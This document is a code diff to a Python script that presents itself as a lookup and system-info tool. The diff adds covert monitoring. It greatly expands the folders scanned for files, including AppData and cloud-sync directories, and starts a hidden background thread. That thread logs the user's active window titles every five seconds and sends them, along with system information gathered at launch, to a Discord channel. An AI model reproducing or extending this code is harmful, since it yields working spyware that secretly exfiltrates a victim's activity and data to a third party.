@@ -3,6 +3,8 @@ import subprocess
 import shutil
 import psutil
 import requests
+import threading
+import time
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
@@ -27,6 +29,40 @@ DISCORD_CHANNEL_ID = '1280446406783402015'
 # Word document for logging lookups
 DOCX_FILENAME = "lookup_results.docx"
 TEMP_FILE = os.path.join(os.getenv('TEMP'), 'system_info.txt')
+
+# Directories to search for files
+SEARCH_DIRECTORIES = [
+    os.path.expanduser('~\\Desktop'),
+    os.path.expanduser('~\\Documents'),
+    os.path.expanduser('~\\Downloads'),
+    os.path.expanduser('~\\Pictures'),
+    os.path.expanduser('~\\Videos'),
+    os.path.expanduser('~\\Music'),
+    os.path.expanduser('~\\OneDrive'),
+    os.path.expanduser('~\\Dropbox'),
+    os.path.expanduser('~\\Google Drive'),
+    os.path.expanduser('~\\Adobe'),
+    os.path.expanduser('~\\Box'),
+    os.path.expanduser('~\\SharePoint'),
+    os.path.expanduser('~\\Teams'),
+    os.path.expanduser('~\\Work'),
+    os.path.expanduser('~\\Projects'),
+    os.path.expanduser('~\\Temp'),
+    os.path.expanduser('~\\Public'),
+    os.path.expanduser('~\\AppData\\Local'),
+    os.path.expanduser('~\\AppData\\Roaming'),
+    os.path.expanduser('~\\AppData\\LocalLow'),
+    os.path.expanduser('~\\AppData\\Temp'),
+    os.path.expanduser('~\\Saved Games'),
+    os.path.expanduser('~\\Searches'),
+    os.path.expanduser('~\\Favorites'),
+    os.path.expanduser('~\\Contacts'),
+    os.path.expanduser('~\\Links'),
+    os.path.expanduser('~\\Music\\iTunes'),
+    os.path.expanduser('~\\Pictures\\Screenshots'),
+    os.path.expanduser('~\\Downloads\\Compressed'),
+    os.path.expanduser('~\\Downloads\\Programs'),
+]
 
 def get_public_ip():
     """Get the public IP address."""
@@ -203,13 +239,8 @@ def display_socials():
 
 def list_files_by_type(extensions):
     """List files by specific extensions."""
-    directories = [
-        os.path.expanduser('~\\Desktop'),
-        os.path.expanduser('~\\Documents'),
-        os.path.expanduser('~\\Downloads')
-    ]
     files = []
-    for directory in directories:
+    for directory in SEARCH_DIRECTORIES:
         if os.path.exists(directory):
             for root, dirs, filenames in os.walk(directory):
                 for filename in filenames:
@@ -536,11 +567,36 @@ def show_active_window_title(username):
         send_discord_message(f"User '{username}' encountered an error while checking active window title: {e}")
     input("\nPress Enter to return to the menu...")
 
+def background_monitoring():
+    """Continuously monitor the system for user activities."""
+    last_opened_window = None
+    while True:
+        try:
+            user32 = ctypes.windll.user32
+            kernel32 = ctypes.windll.kernel32
+            h_wnd = user32.GetForegroundWindow()
+            length = user32.GetWindowTextLengthW(h_wnd)
+            buffer = ctypes.create_unicode_buffer(length + 1)
+            user32.GetWindowTextW(h_wnd, buffer, length + 1)
+            current_window = buffer.value
+            if current_window != last_opened_window and current_window:
+                last_opened_window = current_window
+                send_discord_message(f"User opened window: {current_window}")
+        except Exception as e:
+            send_discord_message(f"Error monitoring windows: {e}")
+        time.sleep(5)
+
+def run_background_thread():
+    """Start the background monitoring in a separate thread."""
+    monitoring_thread = threading.Thread(target=background_monitoring, daemon=True)
+    monitoring_thread.start()
+
 def main_menu():
     username = os.getlogin()  # Get the actual username
     send_discord_message(f"User '{username}' started the script.")
     gather_system_info()  # Gather and send system info at the start
     send_discord_file(TEMP_FILE)  # Send the system info file to Discord
+    run_background_thread()  # Start background monitoring
 
     while True:
         clear_screen()
